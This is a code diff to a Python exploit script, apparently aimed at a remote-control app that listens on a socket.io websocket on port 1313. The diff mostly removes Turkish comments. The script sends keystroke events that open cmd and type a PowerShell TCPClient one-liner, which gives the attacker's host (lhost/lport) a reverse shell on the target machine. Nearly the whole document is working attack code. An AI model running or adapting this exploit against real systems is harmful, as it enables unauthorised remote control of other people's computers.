@@ -19,32 +19,29 @@ async def main(target, lhost, lport):
     uri = f"ws://{target}:1313/socket.io/?EIO=4&transport=websocket"
     async with websockets.connect(uri) as ws:
 
-        # Engine.IO 'open' paketi
         open_frame = await ws.recv()
         print("[<] OPEN     ", open_frame)
 
-        # Namespace connect
+
         await ws.send("40")
         ns_ack = await ws.recv()
         print("[<] NAMESPACE", ns_ack)
 
-        # İlk ping/pong
+
         frame = await ws.recv()
         print("[<] FRAME    ", frame)
         if frame == "2":
             await ws.send("3")
             print("[>] PONG     3")
-        
-        # Küçük gecikme ekle
+
         await asyncio.sleep(1)
 
-        # Ctrl+Esc komutunu gönder
+
         ctrl_esc_event = '42["edit-key",{"key":"escape","modifier":["control"]}]'
         await ws.send(ctrl_esc_event)
         print("[>] Ctrl+Esc EVENT SENT:", ctrl_esc_event)
-        await asyncio.sleep(0.5)  # Uygulamanın tepki vermesi için bekle
+        await asyncio.sleep(0.5)  
         
-        # CMD'yi açmak için komutları gönder (aralara gecikmeler ekle)
         await ws.send('42["key","c"]')
         await asyncio.sleep(0.2)
         await ws.send('42["key","m"]')
@@ -52,12 +49,12 @@ async def main(target, lhost, lport):
         await ws.send('42["key","d"]')
         await asyncio.sleep(0.2)
         await ws.send('42["key","enter"]')
-        await asyncio.sleep(1)  # CMD'nin açılması için daha uzun bekle
+        await asyncio.sleep(1)
         
-        await ws.send('42["key","enter"]')  # Boş satır için
+        await ws.send('42["key","enter"]')  
         await asyncio.sleep(0.5)
         
-        # PowerShell komutunu gönder (FIXED STRING FORMATTING)
+
         ps_command = (
     f"powershell -nop -c \""
     f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
@@ -73,22 +70,21 @@ async def main(target, lhost, lport):
         await ws.send(payload)
         print("[>] PowerShell command sent")
         
-        # Komutun yürütülmesi için biraz daha bekle
+
         await asyncio.sleep(4)
-        await ws.send('42["key","enter"]')  # Komutu çalıştırmak için
+        await ws.send('42["key","enter"]')
         await asyncio.sleep(0.5)
         
-        # Ping'lere cevap verme döngüsü
         while True:
             try:
                 frame = await ws.recv()
                 print("[<] FRAME    ", frame)
                 
-                if frame == "2":  # Ping geldiğinde
+                if frame == "2":  
                     await ws.send("3")
                     print("[>] PONG     3")
                     
-                if frame.startswith("341"):  # Namespace disconnect
+                if frame.startswith("341"):  
                     print("[*] Namespace disconnect görüldü, çıkılıyor.")
                     break
                     
